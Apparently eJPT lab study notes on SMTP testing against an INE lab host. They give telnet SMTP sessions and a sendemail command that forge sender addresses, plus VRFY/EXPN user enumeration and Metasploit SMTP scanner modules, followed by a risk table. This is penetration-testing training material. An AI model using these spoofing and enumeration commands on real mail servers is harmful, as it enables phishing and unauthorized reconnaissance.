## 1. Manual SMTP Enumeration using Telnet

You can directly interact with the SMTP service using Telnet to understand how it behaves.

### Basic Spoofing Example
```bash
telnet demo.ine.local 25
```

Once connected, issue these commands one by one:

```smtp
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to: root@openmailbox.xyz
data
Subject: Hi Root

Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
QUIT
```

**Explanation of each command:**
| Command              | Purpose                                      |
|----------------------|----------------------------------------------|
| `HELO`               | Introduce yourself to the server             |
| `MAIL FROM`          | Set the sender email address (can be spoofed)|
| `RCPT TO`            | Set the recipient email address              |
| `DATA`               | Start writing the email body                 |
| `.` (single dot)     | End the email message                        |
| `QUIT`               | Close the connection                         |

> [!tip] eJPT Tip
> If the server accepts the email without authentication, it may be vulnerable to **spoofing** or acting as an **open relay**.

---

## 2. Using `sendemail` Tool (Easier Method)

The `sendemail` tool makes SMTP spoofing much faster and cleaner.

```bash
sendemail -f admin@attacker.xyz \
          -t root@openmailbox.xyz \
          -s demo.ine.local \
          -u "Fakemail" \
          -m "Hi root, a fake email from admin" \
          -o tls=no
```

**Key options:**
- `-f` → From address (spoofed)
- `-t` → To address (recipient)
- `-s` → SMTP server
- `-u` → Subject
- `-m` → Message body
- `-o tls=no` → Disable TLS (useful in labs)

---

## 3. EHLO Command (Extended Hello)

Modern SMTP servers support `EHLO` which returns the capabilities of the server.

```bash
telnet demo.ine.local 25
EHLO attacker.xyz
```

**What you may see:**
- Supported authentication methods
- Whether TLS is available (`STARTTLS`)
- Maximum message size
- Other extensions

Use `EHLO` instead of `HELO` when you want more information from the server.

---

## 4. Other Useful SMTP Commands

| Command     | Description                                      | Use Case                          |
|-------------|--------------------------------------------------|-----------------------------------|
| `VRFY`      | Verify if an email address exists                | User enumeration (if enabled)     |
| `EXPN`      | Expand mailing lists                             | User enumeration                  |
| `RSET`      | Reset the current transaction                    | Start over without disconnecting  |
| `QUIT`      | Close the connection                             | End session                       |
| `HELP`      | Show available commands                          | Reconnaissance                    |

**Example of user enumeration (if VRFY is enabled):**
```smtp
VRFY root
VRFY admin
```

> [!warning]
> Many modern mail servers disable `VRFY` and `EXPN` for security reasons.

---

## 5. Metasploit SMTP Modules

```bash
# Version detection
use auxiliary/scanner/smtp/smtp_version
set RHOSTS demo.ine.local
run

# SMTP user enumeration (if VRFY/EXPN enabled)
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
run
```

---

## Common Findings & Security Implications

| Finding                        | Risk                              | Impact                                      |
|--------------------------------|-----------------------------------|---------------------------------------------|
| Accepts spoofed emails         | Medium-High                       | Phishing, social engineering attacks        |
| Open mail relay                | High                              | Can be used to send spam/phishing           |
| VRFY/EXPN enabled              | Medium                            | Email address enumeration                   |
| No authentication required     | High                              | Unauthorized email sending                  |
| Old SMTP version               | Medium                            | Possible known vulnerabilities              |

---

## Quick Reference

```bash
# Manual Telnet SMTP interaction
telnet demo.ine.local 25
HELO attacker.xyz
MAIL FROM: admin@attacker.xyz
RCPT TO: root@openmailbox.xyz
DATA
Subject: Test
Hello from pentest.
.
QUIT

# Using sendemail tool
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local \
          -u "Fake Email" -m "This is a test message" -o tls=no

# EHLO for extended information
telnet demo.ine.local 25
EHLO attacker.xyz
```

---

## eJPT Exam & Lab Tips

- Always start with **Telnet** to manually test the SMTP service — it helps you understand exactly what the server allows.
- Use `sendemail` when you want to quickly send spoofed emails during labs.
- Check whether the server requires authentication or allows **null sender** (`MAIL FROM: <>`).
- If you can send emails to internal addresses from outside, note it as a finding (potential for phishing or relay abuse).
- Document the exact commands that worked — this is useful for reporting.

---
